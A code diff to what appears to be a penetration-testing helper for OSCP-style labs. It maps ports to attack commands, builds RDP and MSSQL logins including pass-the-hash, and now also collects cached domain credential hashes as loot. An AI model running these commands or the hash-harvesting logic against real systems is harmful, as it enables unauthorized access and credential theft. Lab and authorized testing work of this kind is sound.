@@ -124,7 +124,7 @@ PORT_HINTS = {
     25:  "smtp user enum: smtp-user-enum -M VRFY -U users.txt -t {ip}",
     53:  "DNS — try zone transfer: dig axfr @{ip} {domain}",
     80:  "web: whatweb http://{ip}; gobuster dir -u http://{ip} -w dirb/common.txt; nikto -h http://{ip}",
-    88:  "KERBEROS = Domain Controller. kerbrute userenum --dc {ip} -d {domain} names.txt; AS-REP roast",
+    88:  "KERBEROS = Domain Controller. kerbrute userenum --dc {ip} -d {domain} /usr/share/seclists/Usernames/Names/names.txt; AS-REP roast",
     110: "pop3 — nc {ip} 110, try creds",
     111: "rpcbind/NFS: rpcinfo {ip}; showmount -e {ip}",
     135: "msrpc: impacket-rpcdump {ip} | grep -i ncacn",
@@ -160,6 +160,7 @@ MAX_CONSECUTIVE_TIMEOUTS = 3
 DEFAULT_MAX_CIDR_HOSTS   = 1024
 DEFAULT_SPRAY_DELAY      = 0     # no delay by default (OSCP boxes have no lockout)
 WORDLIST                 = "/usr/share/wordlists/rockyou.txt"
+HOME                     = os.path.expanduser("~")   # for RDP /drive share, not hardcoded
 
 
 # ─── Data classes ──────────────────────────────────────────────────────
@@ -389,7 +390,7 @@ def build_suggestions(s: Success, ip: str, hostname: str,
         elif proto == "rdp":
             e.append(("xfreerdp3",
                        f"xfreerdp3 /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
-                       f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
+                       f"/dynamic-resolution /drive:share,{HOME} /cert:ignore"))
         elif proto == "mssql":
             e.append(("mssqlclient",
                        f"impacket-mssqlclient {qurl_pw} -windows-auth"))
@@ -459,7 +460,7 @@ def build_suggestions(s: Success, ip: str, hostname: str,
         elif proto == "rdp":
             e.append(("xfreerdp3 [PtH]",
                        f"xfreerdp3 /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
-                       f"/dynamic-resolution /drive:share,/home/kali /cert:ignore"))
+                       f"/dynamic-resolution /drive:share,{HOME} /cert:ignore"))
         elif proto == "mssql":
             e.append(("mssqlclient [PtH]",
                        f"impacket-mssqlclient {qurl_nopw} -hashes :{ha} -windows-auth"))
@@ -1237,9 +1238,12 @@ class NxcPlus:
                 for l in self._parse_nxc_findings(so):
                     if self._SAM_RE.search(l):
                         result.loot_hashes.append(self._SAM_RE.search(l).group(0))
+                    elif self._DCC2_RE.search(l):          # cached domain cred = crackable hash
+                        result.loot_hashes.append(self._DCC2_RE.search(l).group(0))
                     elif self._LSA_RE.match(l):
                         result.loot_hashes.append(self._LSA_RE.match(l).group(0))
                     elif (":" in l and not any(k in l for k in self._LSA_KEYS)
+                          and "$" not in l.split(":", 1)[1]   # not a $DCC2$/$krb5$ hash
                           and " " not in l.split(":")[0]
                           and not re.fullmatch(r"[0-9a-fA-F]{32,}", l.split(":",1)[1].strip() or "x")):
                         result.plaintext.append(l.strip())
